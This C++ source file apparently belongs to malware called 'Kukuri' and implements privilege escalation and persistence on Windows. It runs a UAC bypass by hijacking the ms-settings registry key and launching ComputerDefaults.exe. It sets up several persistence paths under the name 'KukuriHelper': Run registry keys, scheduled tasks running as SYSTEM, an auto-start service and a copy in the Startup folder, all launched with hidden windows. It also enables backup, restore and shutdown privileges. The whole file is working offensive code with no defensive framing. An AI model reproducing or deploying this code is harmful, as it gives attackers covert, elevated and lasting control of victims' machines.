/*
Manages privilege escalation through UAC bypass, registry persistence, and scheduled task creation.
*/
#include "AutoElevate.hpp"
#include <ShlObj.h>
#include <iostream>
#include <filesystem>

bool AutoElevate::createScheduledTask() {
    std::string exePath = getExecutablePath();
    std::string cmd = "schtasks /create /tn \"KukuriHelper\" /tr \"" +
        exePath + "\" /sc onlogon /rl highest /f";

    STARTUPINFOA si;
    PROCESS_INFORMATION pi;

    ZeroMemory(&si, sizeof(si));
    si.cb = sizeof(si);
    ZeroMemory(&pi, sizeof(pi));

    si.dwFlags |= STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_HIDE;

    // Create process to run command
    if (CreateProcessA(NULL, (LPSTR)cmd.c_str(),
        NULL, NULL, FALSE, CREATE_NO_WINDOW,
        NULL, NULL, &si, &pi)) {

        // Wait for the process to finish
        WaitForSingleObject(pi.hProcess, INFINITE);

        // Close process handles
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);

        return true;
    }

    return false;
}

bool AutoElevate::elevatePrivileges() {
    HANDLE token;
    TOKEN_PRIVILEGES tkp;

    // Open process token
    if (!OpenProcessToken(GetCurrentProcess(),
        TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &token)) {
        return false;
    }

    // Get the LUID for shutdown privilege
    LookupPrivilegeValueW(NULL, L"SeShutdownPrivilege", &tkp.Privileges[0].Luid);
    tkp.PrivilegeCount = 1;
    tkp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

    // Get backup privilege
    LookupPrivilegeValueW(NULL, L"SeBackupPrivilege", &tkp.Privileges[1].Luid);
    tkp.PrivilegeCount++;
    tkp.Privileges[1].Attributes = SE_PRIVILEGE_ENABLED;

    // Get restore privilege
    LookupPrivilegeValueW(NULL, L"SeRestorePrivilege", &tkp.Privileges[2].Luid);
    tkp.PrivilegeCount++;
    tkp.Privileges[2].Attributes = SE_PRIVILEGE_ENABLED;

    // Enable privileges
    AdjustTokenPrivileges(token, FALSE, &tkp, 0, NULL, 0);
    CloseHandle(token);

    return true;
}


bool AutoElevate::setAutoRun() {
    try {
        std::string exePath = getExecutablePath();
        bool success = false;

        HKEY hklm;
        if (RegOpenKeyExA(HKEY_LOCAL_MACHINE,
            "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run",
            0, KEY_SET_VALUE, &hklm) == ERROR_SUCCESS) {

            RegSetValueExA(hklm, "KukuriHelper", 0, REG_SZ,
                (BYTE*)exePath.c_str(), exePath.length() + 1);
            RegCloseKey(hklm);
            success = true;
            Logger::getInstance()->info("Added to HKLM startup registry");
        }

        HKEY hkcu;
        if (RegOpenKeyExA(HKEY_CURRENT_USER,
            "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run",
            0, KEY_SET_VALUE, &hkcu) == ERROR_SUCCESS) {

            RegSetValueExA(hkcu, "KukuriHelper", 0, REG_SZ,
                (BYTE*)exePath.c_str(), exePath.length() + 1);
            RegCloseKey(hkcu);
            success = true;
            Logger::getInstance()->info("Added to HKCU startup registry");
        }

        std::string taskCmd = "schtasks /create /tn \"KukuriHelper\" /tr \"'" +
            exePath + "'\" /sc onlogon /rl highest /f /ru System";
        if (system(taskCmd.c_str()) == 0) {
            success = true;
            Logger::getInstance()->info("Created scheduled task");
        }

        std::string serviceCmd = "sc create KukuriHelper binPath= \"" +
            exePath + "\" start= auto";
        if (system(serviceCmd.c_str()) == 0) {
            system("sc start KukuriHelper");
            success = true;
            Logger::getInstance()->info("Created and started service");
        }

        char appDataPath[MAX_PATH];
        if (SUCCEEDED(SHGetFolderPathA(NULL, CSIDL_APPDATA, NULL, 0, appDataPath))) {
            std::string startupPath = std::string(appDataPath) +
                "\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\";
            std::string destPath = startupPath + "KukuriHelper.exe";

            if (CopyFileA(exePath.c_str(), destPath.c_str(), FALSE)) {
                success = true;
                Logger::getInstance()->info("Copied to startup folder");
            }
        }

        return success;
    }
    catch (const std::exception& e) {
        Logger::getInstance()->expection(std::string("Error in setAutoRun: ") + e.what());
        return false;
    }
}

bool AutoElevate::bypassUAC() {
    try {
        Logger::getInstance()->info("Starting UAC bypass process");

        if (isAdmin()) {
            Logger::getInstance()->info("Already running as admin");
            return true;
        }

        // Get current executable path
        std::string exePath = getExecutablePath();
        Logger::getInstance()->info("Current path: " + exePath);

        // ShellExecute method
        Logger::getInstance()->info("Attempting ShellExecute method");
        SHELLEXECUTEINFOA sei = { 0 };
        sei.cbSize = sizeof(SHELLEXECUTEINFOA);
        sei.lpVerb = "runas";
        sei.lpFile = exePath.c_str();
        sei.nShow = SW_NORMAL;

        if (ShellExecuteExA(&sei)) {
            Logger::getInstance()->info("Successfully launched elevated process");
            return true;
        }

        DWORD error = GetLastError();
        Logger::getInstance()->warning("ShellExecute failed with error: " + std::to_string(error));

        // If above failed, try Computer Defaults
        Logger::getInstance()->info("Attempting Computer Defaults method");
        if (setupComputerDefaults()) {
            Logger::getInstance()->info("UAC bypass successful using Computer Defaults");
            return true;
        }

        // Last resort - Task Scheduler
        Logger::getInstance()->info("Attempting Task Scheduler method");
        if (createElevatedTask()) {
            Logger::getInstance()->info("UAC bypass successful using Task Scheduler");
            return true;
        }

        Logger::getInstance()->warning("All UAC bypass methods failed");
        return false;
    }
    catch (const std::exception& e) {
        Logger::getInstance()->expection("Error in bypassUAC: " + std::string(e.what()));
        return false;
    }
}

bool AutoElevate::isAdmin() {
    BOOL isAdmin = FALSE;
    PSID adminGroup;
    SID_IDENTIFIER_AUTHORITY ntAuthority = SECURITY_NT_AUTHORITY;

    if (AllocateAndInitializeSid(&ntAuthority, 2,
        SECURITY_BUILTIN_DOMAIN_RID,
        DOMAIN_ALIAS_RID_ADMINS,
        0, 0, 0, 0, 0, 0, &adminGroup)) {
        CheckTokenMembership(NULL, adminGroup, &isAdmin);
        FreeSid(adminGroup);
    }

    return isAdmin;
}

bool AutoElevate::elevateNow() {
    if (!bypassUAC()) {
        Logger::getInstance()->warning("Failed to bypass UAC");
        return false;
    }

    if (!setAutoRun()) {
        Logger::getInstance()->warning("Failed to set auto run");
        return false;
    }

    return true;
}

std::string AutoElevate::getExecutablePath() {
    char buffer[MAX_PATH];
    GetModuleFileNameA(NULL, buffer, MAX_PATH);
    return std::string(buffer);
}

bool AutoElevate::modifyRegistry(const std::string& regPath, const std::string& keyName, const std::string& value) {
    HKEY hKey;
    if (RegOpenKeyExA(HKEY_CURRENT_USER, regPath.c_str(), 0, KEY_SET_VALUE, &hKey) == ERROR_SUCCESS) {
        RegSetValueExA(hKey, keyName.c_str(), 0, REG_SZ,
            (BYTE*)value.c_str(), value.length() + 1);
        RegCloseKey(hKey);
        return true;
    }
    return false;
}

bool AutoElevate::createElevatedTask() {
    std::string cmd = "schtasks /create /tn \"KukuriService\" /tr \"" +
        getExecutablePath() + "\" /sc onstart /ru System /f";
    return system(cmd.c_str()) == 0;
}

bool AutoElevate::setupComputerDefaults() {
    // Registry path for ComputerDefaults
    std::string regPath = "Software\\Classes\\ms-settings\\Shell\\Open\\command";

    // Add command to registry
    if (!modifyRegistry(regPath, "(Default)", getExecutablePath())) {
        return false;
    }

    // Add DelegateExecute value
    if (!modifyRegistry(regPath, "DelegateExecute", "")) {
        return false;
    }

    // Run ComputerDefaults.exe
    ShellExecuteA(NULL, "open", "C:\\Windows\\System32\\ComputerDefaults.exe",
        NULL, NULL, SW_HIDE);

    return true;
}